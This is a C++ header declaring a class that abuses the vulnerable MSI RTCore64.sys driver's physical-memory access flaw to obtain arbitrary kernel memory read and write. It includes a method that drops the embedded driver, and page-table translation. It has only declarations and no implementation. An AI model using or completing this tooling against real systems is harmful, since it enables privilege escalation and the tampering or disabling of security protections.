/**
 * @file RTCoreProvider.h
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the declaration of the RTCoreProvider class.
 *
 * The RTCoreProvider class is a concrete implementation of the IProvider
 * interface for the vulnerable Micro-Star RTCore64.sys driver. It handles
 * loading the driver and using its physical memory access vulnerability
 * to perform kernel memory operations.
 */

#pragma once

#include "IProvider.h"
#include <string>
#include <Windows.h>

namespace KernelMode {
    namespace Providers {
        /**
         * @class RTCoreProvider
         * @brief Implements the IProvider interface for the RTCore64.sys driver.
         *
         * This class uses the physical memory read/write vulnerability in
         * RTCore64.sys to achieve arbitrary kernel memory read and write
         * primitives. It includes logic to translate virtual addresses to
         * physical addresses by walking the page tables.
         */
        class RTCoreProvider : public IProvider {
        public:
            RTCoreProvider();
            ~RTCoreProvider() override;

            bool Initialize() override;
            void Deinitialize() override;

            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;

        private:
            /**
             * @struct RTCoreReadRequest
             * @brief Structure for the physical memory read IOCTL request.
             */
            #pragma pack(push, 1)
            struct RTCoreReadRequest {
                uintptr_t PhysicalAddress;
                uint32_t ReadSize; // 1, 2, or 4 bytes
            };
            #pragma pack(pop)

            /**
             * @struct RTCoreWriteRequest
             * @brief Structure for the physical memory write IOCTL request.
             */
            #pragma pack(push, 1)
            struct RTCoreWriteRequest {
                uintptr_t PhysicalAddress;
                uint32_t ReadSize; // Not used for write, but part of struct
                uint32_t Value;
            };
            #pragma pack(pop)

            /**
             * @brief Extracts the embedded driver resource to a temporary file.
             * @return True if extraction is successful, false otherwise.
             */
            bool DropDriver();

            /**
             * @brief Reads a value of a given size from a physical address.
             * @param physicalAddress The physical address to read from.
             * @param value The variable to store the read data.
             * @param size The number of bytes to read (1, 2, or 4).
             * @return True on success, false otherwise.
             */
            bool ReadPhysical(uintptr_t physicalAddress, uint32_t& value, uint32_t size);

            /**
             * @brief Writes a value of a given size to a physical address.
             * @param physicalAddress The physical address to write to.
             * @param value The value to write.
             * @param size The number of bytes to write (1, 2, or 4).
             * @return True on success, false otherwise.
             */
            bool WritePhysical(uintptr_t physicalAddress, uint32_t value, uint32_t size);

            /**
             * @brief Translates a kernel virtual address to a physical address.
             * @param virtualAddress The virtual address to translate.
             * @return The corresponding physical address, or 0 on failure.
             */
            uintptr_t VirtualToPhysical(uintptr_t virtualAddress);

            HANDLE deviceHandle;
            SC_HANDLE serviceHandle;
            std::wstring driverPath;
            uintptr_t pml4Base;

            const std::wstring deviceName = L"\\\\.\\RTCore64";
            const std::wstring serviceName = L"RTCore64";
            const std::wstring driverFileName = L"RTCore64.sys";
        };
    }
}